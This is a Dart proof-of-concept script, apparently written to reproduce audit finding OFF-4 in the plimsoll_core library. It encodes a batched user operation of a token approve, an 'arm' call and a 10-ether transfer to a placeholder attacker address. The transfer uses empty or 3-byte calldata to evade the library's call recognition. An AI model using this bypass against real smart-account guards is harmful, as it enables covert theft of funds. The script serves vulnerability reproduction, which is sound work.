// Independent reproduction attempt for OFF-4. Builds preimages and prints them.
// Usage: dart run bin/zz_off4_check.dart <variant>
import 'dart:io';
import 'dart:typed_data';
import 'package:plimsoll_core/plimsoll_core.dart' as p;

Uint8List sel(String hex) => Uint8List.fromList([
      for (var i = 0; i < 8; i += 2) int.parse(hex.substring(i, i + 2), radix: 16),
    ]);

Uint8List encodeBatch(List<(String, BigInt, Uint8List)> calls) {
  final elements = <Uint8List>[
    for (final c in calls)
      p.abiConcat([
        p.abiAddressWord(c.$1),
        p.abiWord(c.$2),
        p.abiWord(BigInt.from(0x60)),
        p.abiDynamicBytes(c.$3),
      ]),
  ];
  var cursor = calls.length * 32;
  final offsets = <Uint8List>[];
  for (final e in elements) {
    offsets.add(p.abiWord(BigInt.from(cursor)));
    cursor += e.length;
  }
  return p.abiConcat([
    sel('2b2ee783'), // executeUserOp — matches plimsoll executeUserOpSelector
    p.abiWord(BigInt.from(32)),
    p.abiWord(BigInt.from(calls.length)),
    ...offsets,
    ...elements,
  ]);
}

void main(List<String> args) {
  final variant = args.isEmpty ? 'empty' : args[0];
  const trimmy = '0xf73a2af06b315adaa1afe2c1a6c1a6933d8a6554';
  const fxrp = '0x0b6a3645c240605887a5532109323a3e12273dc7';
  const attacker = '0x00000000000000000000000000000000deadbeef';

  final approve = p.abiConcat([
    sel('095ea7b3'),
    p.abiAddressWord(trimmy),
    p.abiWord(BigInt.from(1009400)),
  ]);
  final arm = p.abiConcat([
    sel('c33d4cc3'),
    for (var i = 0; i < 14; i++)
      p.abiWord(BigInt.from(i == 9 ? 1786000000 : 1)),
  ]);

  final third = switch (variant) {
    'empty' => (attacker, BigInt.parse('10000000000000000000'), Uint8List(0)),
    'three' => (
        attacker,
        BigInt.parse('10000000000000000000'),
        Uint8List.fromList([0xde, 0xad, 0xbe])
      ),
    // control: 4-byte calldata, should print UNRECOGNISED
    _ => (
        attacker,
        BigInt.parse('10000000000000000000'),
        Uint8List.fromList([0xde, 0xad, 0xbe, 0xef])
      ),
  };

  final op = p.PackedUserOperation(
    sender: '0x07a76b5c3d03f5bff4cb3e043b1d17a1b40920bf',
    nonce: BigInt.zero,
    callData: encodeBatch([
      (fxrp, BigInt.zero, approve),
      (trimmy, BigInt.zero, arm),
      third,
    ]),
  );
  final enc = op.encode();
  stdout.writeln(
      '0x${enc.map((b) => b.toRadixString(16).padLeft(2, '0')).join()}');
}
